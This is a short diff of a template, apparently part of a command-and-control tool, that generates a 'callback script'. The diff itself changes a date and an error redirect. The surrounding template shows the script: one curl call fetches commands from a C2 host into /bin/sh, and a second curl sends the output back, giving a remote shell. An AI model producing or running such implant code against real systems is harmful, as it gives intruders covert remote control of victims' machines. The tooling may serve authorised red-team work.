@@ -3,7 +3,7 @@
      * Callback script (and more) template
      * By J. Stuart McMurray
      * Created 20240325
-     * Last Modified 20250215
+     * Last Modified 20260103
      */ -}}
 
 {{/* curl is a subsubtemplate which makes our curl calls consistent. */}}
@@ -14,7 +14,7 @@ curl -sk --pinnedpubkey sha256//{{.PubkeyFP}} https://{{.C2Addr | nodefaultport}
 {{/* script hooks up a shell to two curls. */}}
 {{- define "script" -}}
 #!/bin/sh
-{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  </dev/null 2>&0 |
+{{template "curl" .}}/{{.URLPaths.In }}/{{.ID}} -N  </dev/null 2>/dev/null |
 /bin/sh 2>&1 |
 {{template "curl" .}}/{{.URLPaths.Out}}/{{.ID}} -T- >/dev/null 2>&1
 {{  end -}}
